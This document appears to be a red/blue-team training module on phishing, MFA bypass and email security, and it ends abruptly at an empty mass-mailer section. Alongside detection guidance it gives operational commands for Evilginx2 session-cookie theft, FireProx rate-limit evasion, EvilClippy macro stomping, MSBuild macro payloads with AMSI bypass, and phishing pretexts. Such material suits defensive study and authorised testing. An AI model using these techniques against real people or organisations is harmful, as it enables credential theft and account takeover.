<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->

# Email Security, Phishing, & Social Engineering — Deep Dive

> CIPHER Training Module | Domain: RED + BLUE + PURPLE
> MITRE ATT&CK: T1566 (Phishing), T1598 (Phishing for Information), T1534 (Internal Spearphishing)
> Last Updated: 2026-03-14

---

## Table of Contents

1. [Phishing Taxonomy & ATT&CK Mapping](#1-phishing-taxonomy--attck-mapping)
2. [Phishing Infrastructure Setup](#2-phishing-infrastructure-setup)
3. [MFA Bypass Techniques](#3-mfa-bypass-techniques)
4. [Email Authentication: SPF, DKIM, DMARC](#4-email-authentication-spf-dkim-dmarc)
5. [Malicious Document & Macro Evasion](#5-malicious-document--macro-evasion)
6. [Social Engineering Pretexting Frameworks](#6-social-engineering-pretexting-frameworks)
7. [Social-Engineer Toolkit (SET) Deep Dive](#7-social-engineer-toolkit-set-deep-dive)
8. [O365 / Microsoft 365 Attack Surface](#8-o365--microsoft-365-attack-surface)
9. [C2 via Legitimate Services](#9-c2-via-legitimate-services)
10. [Defensive Controls & Detection Engineering](#10-defensive-controls--detection-engineering)
11. [Document Analysis & Forensics](#11-document-analysis--forensics)
12. [Email Reputation & Threat Intelligence](#12-email-reputation--threat-intelligence)
13. [Operational Security for Phishing Engagements](#13-operational-security-for-phishing-engagements)
14. [Purple Team: Detection Gaps & Emulation Plans](#14-purple-team-detection-gaps--emulation-plans)

---

## 1. Phishing Taxonomy & ATT&CK Mapping

### T1566 — Phishing (Initial Access)

Adversaries send phishing messages to gain access to victim systems. Four sub-techniques:

| Sub-Technique | ID | Description | Typical Payload |
|---|---|---|---|
| Spearphishing Attachment | T1566.001 | Malicious file delivered via email | Macro-enabled docs, ISO/IMG, LNK, OneNote |
| Spearphishing Link | T1566.002 | Malicious URL in email body | Credential harvester, drive-by download |
| Spearphishing via Service | T1566.003 | Phishing through third-party platforms (LinkedIn, Slack, Teams) | OAuth consent, malicious links |
| Spearphishing Voice | T1566.004 | Phone-based (vishing), callback phishing | Directing victims to install RMM tools |

**Real-World Threat Actor Usage:**
- **APT28 (Fancy Bear)**: Credential phishing targeting election staff [CONFIRMED]
- **Kimsuky (G0094)**: Tailored spearphishing for contact list exfiltration and intelligence gathering [CONFIRMED]
- **Scattered Spider (G1015)**: Credential phishing combined with social engineering to capture OTPs [CONFIRMED]
- **GOLD SOUTHFIELD (G0115)**: Malspam campaigns for ransomware initial access [CONFIRMED]
- **Royal (S1073)**: Callback phishing variant — victim calls attacker, installs RMM tool [CONFIRMED]
- **INC Ransom (G1032)**: Standard spearphishing for ransomware entry [CONFIRMED]
- **Sea Turtle (G1041)**: Spearphishing for DNS hijacking campaigns [CONFIRMED]

### T1598 — Phishing for Information (Reconnaissance)

Unlike T1566, the goal is information gathering, not code execution:

| Sub-Technique | ID | Description |
|---|---|---|
| Spearphishing Service | T1598.001 | Recon via service-based platforms |
| Spearphishing Attachment | T1598.002 | Attachments designed to elicit information |
| Spearphishing Link | T1598.003 | Links to credential harvesting pages |
| Spearphishing Voice | T1598.004 | Vishing for information extraction |

**Key Distinction:** T1598 is reconnaissance-phase — gathering credentials, org charts, internal processes. T1566 is initial-access-phase — deploying payloads or establishing footholds.

### Additional Related Techniques

| Technique | ID | Relevance |
|---|---|---|
| Internal Spearphishing | T1534 | Lateral phishing from compromised mailbox |
| Gather Victim Identity Information | T1589 | Pre-phishing OSINT |
| Establish Accounts: Email | T1585.002 | Attacker infrastructure setup |
| Acquire Infrastructure: Domains | T1583.001 | Lookalike domain registration |
| Stage Capabilities: Link Target | T1608.005 | Hosting phishing pages |

---

## 2. Phishing Infrastructure Setup

### 2.1 GoPhish — Open-Source Phishing Framework

**Source:** github.com/gophish/gophish | MIT License | Go-based
**Purpose:** Campaign management, email template creation, landing page cloning, tracking, and reporting.

#### Architecture

```
┌─────────────────────────────────────────────────┐
│                  GoPhish Server                  │
│  ┌──────────┐  ┌──────────┐  ┌───────────────┐  │
│  │ Admin UI │  │ Phishing │  │   REST API    │  │
│  │ :3333    │  │ Server   │  │   :3333/api   │  │
│  │ (HTTPS)  │  │ :80/:443 │  │               │  │
│  └──────────┘  └──────────┘  └───────────────┘  │
│  ┌──────────┐  ┌──────────┐  ┌───────────────┐  │
│  │ Mailer   │  │ Template │  │  SQLite/MySQL  │  │
│  │ (SMTP)   │  │ Engine   │  │   Database     │  │
│  └──────────┘  └──────────┘  └───────────────┘  │
└─────────────────────────────────────────────────┘
```

#### Installation

```bash
# Pre-built binary (recommended for engagements)
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish
# Default: https://localhost:3333, credentials in stdout

# From source
git clone https://github.com/gophish/gophish.git
cd gophish && go build

# Docker
docker pull gophish/gophish
docker run -p 3333:3333 -p 80:80 gophish/gophish
```

#### Campaign Setup Workflow

1. **Sending Profile**: Configure SMTP relay (own mail server, compromised relay, or provider)
2. **Email Template**: HTML/text email with tracking pixel, link embedding (`{{.URL}}` template variable)
3. **Landing Page**: Clone target login page or import custom HTML; captures submitted credentials
4. **User Group**: Import target email list (CSV: First Name, Last Name, Email, Position)
5. **Campaign**: Combine all components, set launch time, monitor results

#### Key Configuration (config.json)

```json
{
  "admin_server": {
    "listen_url": "0.0.0.0:3333",
    "use_tls": true,
    "cert_path": "gophish_admin.crt",
    "key_path": "gophish_admin.key"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:443",
    "use_tls": true,
    "cert_path": "phish.crt",
    "key_path": "phish.key"
  }
}
```

#### Tracking Capabilities

- **Email opened**: 1x1 tracking pixel (transparent GIF with unique ID)
- **Link clicked**: Redirect through GoPhish server with user-specific token
- **Credentials submitted**: POST data capture from cloned landing pages
- **Per-user timeline**: Exact timestamps for open/click/submit events
- **API-driven**: Full REST API for automation and integration

#### Operational Notes

- Use Let's Encrypt for TLS on phishing server (credibility + avoids browser warnings)
- Configure `Rid` parameter obfuscation to avoid signature detection
- Customize tracking pixel filename (default is detectable)
- Use GoPhish behind a reverse proxy (Caddy/nginx) for production deployments
- Always set `X-Mailer` header customization to avoid GoPhish fingerprinting

**DETECTION OPPORTUNITY:** Default GoPhish installations expose `X-Mailer: gophish` header, `/track` and `/report` URL paths, and predictable `rid` parameter patterns. [CONFIRMED]

### 2.2 FireProx — AWS API Gateway IP Rotation

**Source:** github.com/ustayready/fireprox | Python 3.6+
**Purpose:** Rotate source IP addresses per request using AWS API Gateway as a pass-through proxy.

#### How It Works

```
Attacker → AWS API Gateway (rotating IPs) → Target
                  ↓
         Each request gets a new
         source IP from AWS pool
```

AWS API Gateway distributes requests across its infrastructure, producing a different egress IP for each request. This defeats IP-based rate limiting, blocklisting, and geo-fencing.

#### Setup

```bash
git clone https://github.com/ustayready/fireprox
cd fireprox
pip install -r requirements.txt

# Create a proxy
python fire.py --access_key <KEY> --secret_access_key <SECRET> \
  --region us-east-1 --command create \
  --url https://target-login.example.com

# List active proxies
python fire.py --access_key <KEY> --secret_access_key <SECRET> \
  --command list

# Delete proxy
python fire.py --access_key <KEY> --secret_access_key <SECRET> \
  --command delete --api_id <API_ID>
```

#### Integration with Phishing Tools

- Point GoPhish sending profile through FireProx endpoint
- Use with Oh365UserFinder for enumeration without rate-limiting blocks
- Combine with credential stuffing tools (spray attacks)
- Use `X-My-X-Forwarded-For` header to spoof the forwarded IP downstream

#### Operational Limitations

- AWS `X-Forwarded-For` header leaks original IP to target — CloudFlare and WAFs can detect this
- Subject to AWS Acceptable Use Policy — use dedicated engagement AWS accounts
- API Gateway has a 29-second timeout per request
- 10 MB payload size limit per request

**DETECTION OPPORTUNITY:** Traffic from API Gateway has distinctive patterns: `X-Forwarded-For` header present, source IPs from AWS IP ranges (publicly documented), `User-Agent` may contain API Gateway identifiers. Monitor for rapid IP rotation from AWS CIDR blocks against authentication endpoints. [CONFIRMED]

### 2.3 Domain Infrastructure

#### Lookalike Domain Strategies

| Technique | Example | Difficulty to Detect |
|---|---|---|
| Typosquatting | `examp1e.com`, `exampel.com` | Medium |
| Homograph (IDN) | `еxample.com` (Cyrillic 'е') | High (punycode: xn--xample-9uf.com) |
| TLD substitution | `example.co`, `example.io` | Low |
| Subdomain abuse | `login.example.com.attacker.com` | Medium |
| Hyphenation | `example-login.com` | Low |
| Keyword combo | `example-security.com` | Medium |

#### Domain Aging & Reputation Building

- Register domains 30+ days before engagement (avoids "newly registered domain" flags)
- Set up SPF, DKIM, DMARC on phishing domains (ironic but necessary for deliverability)
- Send benign email traffic to build domain reputation
- Use subdomains of categorized domains (redirect categorized parent domains)
- Consider expired domain purchases with existing reputation/backlinks

#### Infrastructure Architecture (Production Engagement)

```
┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  Redirector  │────→│  GoPhish     │────→│  C2 Server   │
│  (Caddy/     │     │  (Campaign   │     │  (Payload    │
│   Nginx)     │     │   Mgmt)      │     │   Delivery)  │
│  TLS Term    │     │              │     │              │
└──────────────┘     └──────────────┘     └──────────────┘
       ↑                    ↑
       │              ┌──────────────┐
   Victim         │  SMTP Relay  │
   Traffic        │  (Postfix /  │
                  │   AWS SES)   │
                  └──────────────┘
```

- **Redirector**: Front-end proxy with valid TLS cert, redirects to GoPhish based on User-Agent/path
- **GoPhish**: Internal campaign server, not directly exposed
- **SMTP Relay**: Separate server for email delivery (Postfix with proper PTR/SPF/DKIM)
- **C2 Server**: Backend for payload callbacks (separate from phishing infra)

---

## 3. MFA Bypass Techniques

### 3.1 Evilginx2 — Reverse Proxy Phishing Framework

**Source:** github.com/kgretzky/evilginx2 | Go-based
**Purpose:** Man-in-the-middle attack framework that captures credentials AND session tokens, bypassing 2FA/MFA.

#### How It Works

```
Victim Browser ──→ Evilginx2 Proxy ──→ Legitimate Service
                  (attacker.com)         (office.com)
                       │
                       ├── Captures username/password
                       ├── Captures session cookies
                       ├── Captures MFA tokens in transit
                       └── Stores authenticated session
```

1. Victim visits phishing domain (e.g., `login.0ffice365.com`)
2. Evilginx2 proxies the request to the real Microsoft login page
3. Victim sees legitimate login UI (proxied in real-time)
4. Victim enters credentials → Evilginx2 captures and forwards them
5. Victim completes MFA challenge → real service issues session cookie
6. Evilginx2 intercepts the session cookie before forwarding to victim
7. Attacker uses captured session cookie to access victim's account

#### Key Architecture

- **Standalone HTTP/DNS servers**: No nginx dependency (despite the name)
- **Phishlets**: YAML configuration files defining URL rewriting rules for specific services
- **SQLite database**: Stores captured credentials and session tokens
- **Wildcard TLS certificates**: Automatic via Let's Encrypt for all subdomains

#### Phishlet Concept

A phishlet defines how Evilginx2 proxies a specific service. It specifies:
- Which domains/subdomains to proxy
- How to rewrite URLs between phishing and real domains
- Which cookies to capture (session tokens)
- What credential fields to extract from POST data
- Custom JavaScript injection points

#### DNS Configuration

```
# Required DNS records for phishing domain
A     phishing.com        → <evilginx2-IP>
A     *.phishing.com      → <evilginx2-IP>
NS    phishing.com        → <evilginx2-IP>  (if using built-in DNS)
```

#### Deployment

```bash
# Basic deployment
./evilginx2 -p ./phishlets -developer

# Production (with DNS)
./evilginx2 -p ./phishlets

# Inside evilginx2 console:
config domain phishing.com
config ipv4 <external-ip>
phishlets hostname o365 login.phishing.com
phishlets enable o365
lures create o365
lures get-url 0
```

#### Pro Features (Evilginx Pro)

- Chrome Enhanced Browser Protection bypass
- BotGuard protection (Cloudflare Turnstile-like bot filtering)
- Evilpuppet: Advanced Google-specific phishing
- JavaScript and HTML obfuscation for detection evasion
- External DNS provider integration
- Multi-domain support

#### Captured Data

- Username and password (plaintext)
- Session cookies (can be imported into browser to hijack session)
- MFA tokens (TOTP codes in transit, though session cookie is the real prize)
- Custom tokens and headers defined in phishlet

### 3.2 Other MFA Bypass Approaches

| Method | Mechanism | Complexity | ATT&CK |
|---|---|---|---|
| **Evilginx2/Modlishka** | Real-time reverse proxy | Medium | T1557 + T1566.002 |
| **AiTM via Cloudflare Workers** | Serverless proxy | Medium | T1566.002 |
| **OAuth consent phishing** | App authorization abuse | Low | T1566.002 + T1550.001 |
| **SIM swapping** | Carrier social engineering | High | T1566.004 + T1111 |
| **Push fatigue** | Repeated MFA push notifications | Low | T1621 |
| **Callback phishing + RMM** | Victim installs remote access | Low | T1566.004 |
| **Adversary-in-the-Browser** | Browser extension compromise | High | T1185 |
| **Token theft (malware)** | Steal cookies/tokens from disk | Medium | T1539 |

### 3.3 OAuth Token Phishing (O365 Attack Toolkit)

**Source:** github.com/mdsecactivebreach/o365-attack-toolkit | Go-based

#### Attack Flow

```
1. Attacker registers Azure AD application with broad permissions
2. Victim receives phishing email with OAuth consent link
3. Victim clicks → redirected to legitimate Microsoft OAuth page
4. Victim grants consent → attacker receives OAuth access + refresh tokens
5. Attacker uses tokens via Microsoft Graph API to:
   - Read/send email from victim's mailbox
   - Access OneDrive/SharePoint files
   - Enumerate contacts
   - Establish persistence via refresh tokens
```

#### Required Azure App Configuration

```ini
[oauth]
clientid = <Azure-App-ID>
clientsecret = <Generated-Secret>
scope = "offline_access contacts.read user.read mail.read mail.send files.readWrite.all"
redirecturi = "http://localhost:30662/gettoken"
```

#### Post-Exploitation Capabilities

- **Email search**: Full mailbox access as if logged in
- **Email sending**: Send from victim's legitimate mailbox (devastating for internal spearphishing, T1534)
- **File access**: OneDrive, OneDrive for Business, SharePoint libraries
- **File replacement**: Swap legitimate documents with backdoored versions
- **Contact enumeration**: Map internal org structure for further targeting

**DETECTION OPPORTUNITY:** Monitor Azure AD for unusual OAuth consent grants, applications requesting `mail.send` + `files.readWrite.all` scopes, and tokens with `offline_access` from unfamiliar client IDs. Check Azure AD sign-in logs for consent events from suspicious IPs. [CONFIRMED]

**PRIVACY IMPLICATION:** OAuth token phishing grants full mailbox access — GDPR Art. 33 notification trigger if PII is exfiltrated. Document scope of compromise for breach assessment. [CONFIRMED]

---

## 4. Email Authentication: SPF, DKIM, DMARC

### 4.1 SPF (Sender Policy Framework)

**Purpose:** Declares which IP addresses/servers are authorized to send email for a domain.

#### Record Syntax

```dns
example.com.  IN  TXT  "v=spf1 ip4:192.0.2.0/24 include:_spf.google.com ~all"
```

| Mechanism | Meaning |
|---|---|
| `ip4:` / `ip6:` | Authorize specific IP ranges |
| `include:` | Include another domain's SPF record |
| `a` | Authorize the domain's A record IP |
| `mx` | Authorize the domain's MX record IPs |
| `all` | Match everything (used with qualifier) |

| Qualifier | Meaning |
|---|---|
| `+all` | Pass (authorize everything — defeats SPF purpose) |
| `-all` | Hard fail (reject unauthorized senders) |
| `~all` | Soft fail (accept but mark — common transitional policy) |
| `?all` | Neutral (no policy — same as no SPF) |

#### Common Misconfigurations [CONFIRMED]

- `~all` instead of `-all` (soft fail allows spoofing to pass through)
- Too many DNS lookups (SPF has 10 lookup limit; exceeding causes permerror)
- Overly broad `include:` chains (including third-party ESPs that include others)
- Missing SPF record entirely (allows unrestricted spoofing)
- `+all` in record (authorizes everything — complete bypass)

### 4.2 DKIM (DomainKeys Identified Mail)

**Purpose:** Cryptographically sign email headers and body, proving the message was not altered in transit and was sent by an authorized server.

#### How It Works

```
Sending Server                              Receiving Server
     │                                            │
     ├── Hash email headers+body                  │
     ├── Sign hash with private key               │
     ├── Add DKIM-Signature header                │
     │                                            │
     ├──── Email in transit ─────────────────────→│
     │                                            ├── Extract DKIM-Signature header
     │                                            ├── Query DNS for public key
     │                                            │   (selector._domainkey.example.com)
     │                                            ├── Verify signature with public key
     │                                            └── Pass/Fail
```

#### DNS Record

```dns
selector1._domainkey.example.com.  IN  TXT  "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3..."
```

#### DKIM-Signature Header Fields

| Tag | Meaning |
|---|---|
| `v=1` | Version |
| `a=rsa-sha256` | Algorithm |
| `d=example.com` | Signing domain |
| `s=selector1` | Selector (for key lookup) |
| `h=from:to:subject:date` | Signed headers |
| `bh=` | Body hash |
| `b=` | Signature |

#### Offensive Considerations

- DKIM replay attacks: Take a legitimately signed email and resend it (signature remains valid)
- Some organizations sign with `l=` (length tag) — attacker can append content after the signed body
- If private key is compromised, attacker can sign emails as the domain

### 4.3 DMARC (Domain-based Message Authentication, Reporting & Conformance)

**Purpose:** Ties SPF and DKIM together with a policy for handling failures and a reporting mechanism.

#### DNS Record

```dns
_dmarc.example.com.  IN  TXT  "v=DMARC1; p=reject; rua=mailto:dmarc-agg@example.com; ruf=mailto:dmarc-forensic@example.com; adkim=s; aspf=s; pct=100"
```

| Tag | Values | Meaning |
|---|---|---|
| `v=DMARC1` | Required | Version |
| `p=` | `none`, `quarantine`, `reject` | Policy for domain |
| `sp=` | `none`, `quarantine`, `reject` | Policy for subdomains |
| `rua=` | `mailto:` URI | Aggregate report destination |
| `ruf=` | `mailto:` URI | Forensic report destination |
| `adkim=` | `r` (relaxed), `s` (strict) | DKIM alignment mode |
| `aspf=` | `r` (relaxed), `s` (strict) | SPF alignment mode |
| `pct=` | 0-100 | Percentage of messages to apply policy |

#### Alignment Explained

- **Relaxed alignment**: The authenticated domain (SPF/DKIM) must share the same organizational domain as the From: header. E.g., `mail.example.com` aligns with `example.com`.
- **Strict alignment**: Exact match required between authenticated domain and From: header domain.

#### DMARC Policy Progression (Recommended Deployment)

```
Phase 1: p=none     (monitor only, collect aggregate reports)
Phase 2: p=quarantine; pct=25  (quarantine 25% of failures)
Phase 3: p=quarantine; pct=100 (quarantine all failures)
Phase 4: p=reject; pct=25     (reject 25% of failures)
Phase 5: p=reject; pct=100    (full enforcement)
```

#### Common DMARC Failures & Bypass Scenarios [CONFIRMED]

| Scenario | Bypass Method |
|---|---|
| `p=none` | No enforcement — spoofing succeeds |
| No `sp=` tag with `p=reject` | Subdomain spoofing (subdomains inherit `p=none` in some implementations) |
| `pct=0` or low `pct` | Most spoofed emails pass through |
| Relaxed alignment | Spoof subdomain that shares organizational domain |
| No DMARC record | No policy — spoofing unimpeded |
| Third-party sender misconfiguration | Legitimate email fails, training users to ignore failures |

### 4.4 Additional Email Transport Security

| Protocol | Purpose | Record |
|---|---|---|
| **MTA-STS** | Enforce TLS for SMTP transport | `_mta-sts.example.com` TXT + policy file at `mta-sts.example.com/.well-known/mta-sts.txt` |
| **DANE/TLSA** | Certificate pinning for SMTP via DNSSEC | `_25._tcp.mail.example.com` TLSA record |
| **BIMI** | Brand indicator (logo) for authenticated email | `default._bimi.example.com` TXT with SVG logo URL |
| **ARC** | Authentication chain for forwarded email | Headers: `ARC-Seal`, `ARC-Message-Signature`, `ARC-Authentication-Results` |

---

## 5. Malicious Document & Macro Evasion

### 5.1 EvilClippy — VBA Stomping & Macro Hiding

**Source:** github.com/outflanknl/EvilClippy | C# (Mono-compatible)
**Purpose:** Manipulate MS Office documents to hide VBA macros and evade analysis tools.

#### Core Techniques

**VBA Stomping (P-Code Abuse):**
Office documents store both VBA source code and compiled P-code in module streams. EvilClippy replaces the visible VBA source with decoy code while preserving the malicious P-code. When opened, Office executes the P-code (not the displayed source).

```
Module Stream:
┌─────────────────────┐
│ VBA Source (visible) │ ← Decoy: Sub AutoOpen() / MsgBox "Hello" / End Sub
├─────────────────────┤
│ P-Code (compiled)   │ ← Actual payload: Shell("powershell -enc ...")
└─────────────────────┘
```

**Critical constraint:** The VBA project version must match the target's Office version for P-code execution. Mismatch causes Office to recompile from (decoy) VBA source.

**Macro Hiding:**
Removes module entries from the project stream — macros become invisible in the VBA editor GUI. `ThisDocument` module remains visible by default.

**Module Name Obfuscation:**
Exploits MODULESTREAMNAME record ambiguity — sets random ASCII names while keeping Unicode names intact. Most analysis tools crash, but Office still executes the code.

#### Usage

```bash
# VBA stomp — replace VBA source with dummy while keeping P-code
mono EvilClippy.exe -s fakecode.vba malicious.doc

# Hide macros from VBA editor
mono EvilClippy.exe -g malicious.doc

# Set random module names (breaks analysis tools)
mono EvilClippy.exe -r malicious.doc

# Lock VBA project (prevent viewing)
mono EvilClippy.exe -u malicious.doc

# Combine: stomp + hide + random names
mono EvilClippy.exe -s fakecode.vba -g -r malicious.doc
```

**Limitation:** VBA stomping does NOT work for `.xls` (Excel 97-2003) format. Works with `.doc`, `.dot`, and modern Excel formats.

**DETECTION OPPORTUNITY:** Compare VBA source code with P-code disassembly — mismatch indicates stomping. Tools: `pcodedmp` for P-code disassembly, `olevba` for VBA source extraction. Hash divergence between the two is a strong indicator. [CONFIRMED]

### 5.2 MaliciousMacroMSBuild — MSBuild Whitelisting Bypass

**Source:** github.com/infosecn1nja/MaliciousMacroMSBuild | Python

#### Mechanism

Generates VBA macros that invoke `MSBuild.exe` (a legitimate, signed Windows binary) to execute embedded payloads. Since MSBuild is a trusted application, it bypasses application whitelisting (AppLocker, WDAC default policies).

```
VBA Macro → Writes .csproj XML to disk → Invokes MSBuild.exe → Payload executes
                                              (trusted binary)
```

#### Payload Types

- Shellcode (staged and stageless)
- PowerShell scripts
- Custom MSBuild XML configurations

#### Evasion Features

| Feature | Flag | Description |
|---|---|---|
| Domain keying | `-d domain` | Execute only on target domain (sandbox evasion) |
| Kill date | `-k dd/MM/yyyy` | Auto-expire payload after date |
| AMSI bypass | `-a` | Bypass Antimalware Scan Interface via Office trusted locations |
| PPID spoofing | Built-in | Uses COM GUID for parent PID manipulation |
| Auto-cleanup | Built-in | Removes `.csproj` file post-execution |

#### Usage

```bash
# Shellcode payload
python m3-gen.py -p shellcode -i beacon.bin -o output.vba

# PowerShell payload with domain keying and kill date
python m3-gen.py -p powershell -i payload.ps1 -o output.vba -d targetcorp -k 30/06/2026

# With AMSI bypass
python m3-gen.py -p shellcode -i beacon.bin -o output.vba -a
```

**DETECTION OPPORTUNITY:** Monitor for `MSBuild.exe` spawned by Office processes (`WINWORD.EXE`, `EXCEL.EXE`, `POWERPNT.EXE`). Sigma rule on parent-child process relationship. Also monitor for `.csproj` / `.xml` files written to temp directories. [CONFIRMED]

### 5.3 Malicious Macro Generator (MMG)

**Source:** github.com/Mr-Un1k0d3r/MaliciousMacroGenerator | Python 2.7

#### Sandbox Evasion Techniques (Built-in)

| Check | Method | Rationale |
|---|---|---|
| Domain validation | `USERDOMAIN` env var | Sandboxes use generic domain names |
| Disk space | Total capacity check | Sandboxes often have <60GB disks |
| Memory | RAM assessment | Sandboxes typically have low RAM |
| Uptime | System boot time | Freshly booted = likely sandbox |
| Process check | Look for `outlook.exe` | Real workstations run Outlook |

#### Obfuscation Features

- Hex encoding of strings (`--strings_to_hex`)
- Random string fragmentation (`--split_strings`)
- Variable name obfuscation with configurable offsets
- JSON-based configuration for repeatable builds

### 5.4 Modern Macro-Free Attack Vectors

With Microsoft disabling macros by default in Office docs from the internet (Mark-of-the-Web, 2022+), attackers have shifted:

| Vector | Mechanism | MOTW Bypass |
|---|---|---|
| **ISO/IMG mounting** | Container files strip MOTW from contents | Yes (pre-patch) |
| **LNK files** | Shortcut files with embedded commands | Partial |
| **OneNote (.one)** | Embedded scripts/executables | Yes (pre-patch) |
| **HTML smuggling** | JavaScript generates payload client-side | Yes |
| **CHM files** | Compiled HTML with embedded scripts | Partial |
| **XLL add-ins** | Excel add-in DLLs | Bypasses macro block |
| **MSIX/AppX** | Signed package with malicious protocol handler | Yes |
| **WSF/VBS via ZIP** | Script files in archives | Depends on extractor |

---

## 6. Social Engineering Pretexting Frameworks

### 6.1 Social-Engineer.org Framework

The Social Engineering Framework organizes attacks across six domains:

#### 1. Information Gathering

- **Communication models**: Understanding how the target communicates
- **Physical reconnaissance**: On-site observation, dumpster diving
- **Technical recon**: OSINT, email harvesting, social media profiling
- **Dumpster diving**: Physical document recovery

#### 2. Psychological Principles

| Principle | Application |
|---|---|
| **Microexpressions** | Read involuntary facial cues during vishing |
| **Rapport building** | Establish trust before making requests |
| **Interview & interrogation** | Elicitation without detection |
| **Human buffer overflow** | Overload cognitive capacity to bypass critical thinking |
| **NLP (Neuro-Linguistic Programming)** | Language patterns for influence |

#### 3. Cialdini's Eight Influence Principles

| Principle | Phishing Application |
|---|---|
| **Authority** | "IT Department requires you to verify your credentials" |
| **Commitment/Consistency** | Start with small request, escalate |
| **Concession** | "We reduced the deadline from 1 hour to 24 hours" |
| **Liking** | Impersonate friendly colleague, use first names |
| **Obligation** | "I helped you last week, could you..." |
| **Reciprocity** | Send useful info first, then ask for something |
| **Scarcity** | "Only 2 hours left to claim your bonus" |
| **Social proof** | "Your team has already completed this verification" |

#### 4. Attack Vectors

| Vector | Description |
|---|---|
| **Phishing** | Email-based social engineering |
| **Vishing** | Voice (phone) social engineering |
| **SMiShing** | SMS-based social engineering |
| **Impersonation** | Physical or digital identity assumption |

#### 5. SE Tools

- **Computer-based**: Maltego (OSINT), SET (attack automation), phishing frameworks
- **Phone-based**: Burner phones, caller ID spoofing services (SpoofCard, etc.)
- **Physical**: Cameras, GPS trackers, lock picking tools, recording devices, USB drops

### 6.2 Pretexting Methodology

A pretext is the constructed scenario used to engage a target. Effective pretexts follow the PIER model:

```
P — Plausibility:  Does the scenario make sense in context?
I — Identity:      Is the assumed identity believable and verifiable?
E — Emotional:     Does it trigger urgency, fear, curiosity, or helpfulness?
R — Request:       Is the ask reasonable for the pretext?
```

#### Common Pretext Categories

| Pretext | Scenario | Target Action |
|---|---|---|
| **IT Support** | "We're migrating to new email system, verify credentials" | Credential entry |
| **Executive Urgent** | "CEO needs wire transfer immediately" (BEC) | Financial action |
| **Vendor/Supplier** | "Updated bank details for invoice payment" | Financial action |
| **HR/Benefits** | "Open enrollment deadline, update benefits portal" | Credential entry |
| **Delivery/Shipping** | "Package delivery failed, track here" | Link click |
| **Security Alert** | "Unusual login detected, verify identity" | Credential entry |
| **Legal/Compliance** | "Required compliance training, due today" | Attachment open |
| **New Employee** | "Hi, I'm new on the team, could you help me with..." | Information disclosure |

#### Pretext Development Checklist

1. Research target organization structure (LinkedIn, website, SEC filings)
2. Identify communication patterns (email signature format, internal jargon)
3. Select emotional trigger appropriate to target's role
4. Build supporting collateral (fake email template, spoofed caller ID, fake badge)
5. Prepare for verification attempts (have answers for "who is your manager?")
6. Plan escalation and exit strategies
7. Document everything for engagement report

---

## 7. Social-Engineer Toolkit (SET) Deep Dive

### 7.1 Architecture Overview

SET (by TrustedSec/David Kennedy) is a Python-based framework that automates social engineering attack vectors. Structure from source analysis:

```
setoolkit (main entry)
├── src/core/
│   ├── set.py              — Main menu loop and attack vector routing
│   ├── setcore.py          — Core library (75K lines): crypto, web, payload generation
│   ├── menu/text.py        — All menu text and attack descriptions
│   ├── config.baseline     — Default configuration (265 lines)
│   ├── msf_attacks/        — Metasploit payload integration
│   ├── payloadgen/         — Custom payload generation (40K lines)
│   ├── ssl/                — SSL/TLS handling for web attacks
│   └── webserver.py        — Built-in HTTP server
├── src/phishing/
│   └── smtp/client/smtp_web.py  — Mass mailer with SMTP relay support
├── src/webattack/
│   ├── harvester/          — Credential harvesting server
│   ├── web_clone/cloner.py — Website cloning engine
│   ├── hta/                — HTA (HTML Application) attack
│   ├── tabnabbing/         — Tab-nabbing attack
│   └── multi_attack/       — Combined attack vectors
├── src/payloads/
│   ├── powershell/         — PowerShell reverse shells, shellcode injection
│   └── set_payloads/       — Custom SET payloads
├── src/wireless/           — Rogue AP attack vector
├── src/teensy/             — Arduino/Teensy HID attacks
├── src/qrcode/             — QR code attack generation
└── modules/                — Third-party modules (RATTE, Google Analytics)
```

### 7.2 Attack Vectors (from menu/text.py)

#### Main Menu (Social-Engineering Attacks)

| # | Vector | Description |
|---|---|---|
| 1 | **Spear-Phishing Attack Vectors** | Mass email with malicious attachments |
| 2 | **Website Attack Vectors** | Clone sites, credential harvest, browser exploits |
| 3 | **Infectious Media Generator** | USB/CD/DVD autorun payloads |
| 4 | **Create a Payload and Listener** | Standalone payload generation |
| 5 | **Mass Mailer Attack** | Bulk email sending |
| 6 | **Arduino-Based Attack Vector** | Teensy USB HID keystroke injection |
| 7 | **Wireless Access Point Attack** | Rogue AP with DNS spoofing |
| 8 | **QRCode Generator** | Malicious QR codes |
| 9 | **PowerShell Attack Vectors** | PS-based shellcode injection, reverse shells |
| 10 | **Third Party Modules** | Extensible module system |

#### Website Attack Sub-Vectors

| # | Method | Mechanism |
|---|---|---|
| 1 | **Java Applet Attack** | Spoofed Java certificate, Metasploit payload delivery |
| 2 | **Metasploit Browser Exploit** | iframe injection with browser exploits |
| 3 | **Credential Harvester** | Clone login page, capture POST data |
| 4 | **Tabnabbing** | Replace inactive tab content with phishing page |
| 5 | **Web Jacking** | iframe replacement with URL bar deception |
| 6 | **Multi-Attack** | Combined Java + Browser + Harvester simultaneously |
| 7 | **HTA Attack** | PowerShell injection via HTML Application files |

### 7.3 Credential Harvester (harvester.py Analysis)

From source code analysis, the credential harvester:

1. **Clones target website** using `wget` (deep or shallow) or Python `urllib`
2. **Injects POST handler** that captures all form submissions
3. **Runs threaded HTTP server** on configurable port (default 80)
4. **Pattern matches credentials**: Regex for `Email|login|user|username` and `pwd|pass|password|secret|PIN`
5. **Tracks visits vs. bites**: Separate counters for page views and form submissions
6. **Supports SSL**: Optional OpenSSL integration with self-signed or custom certificates
7. **Apache mode**: Copies files to Apache webroot, uses PHP POST handler for persistence
8. **Email tracking**: Base64-encoded user identifiers appended to URLs (`?INSERTUSERHERE`)
9. **Redirects post-capture**: Sends victim to real site after credential capture

**Key Code Pattern (harvester.py):**
```python
# Credential detection regex
match = re.search("Email|email|login|logon|Logon|Login|user|username|Username|User", line)
match2 = re.search("pwd|pass|uid|uname|Uname|userid|userID|USER|USERNAME|PIN|pin|password|Password|secret|Secret|Pass", line)
```

### 7.4 Mass Mailer (smtp_web.py Analysis)

From source code analysis:

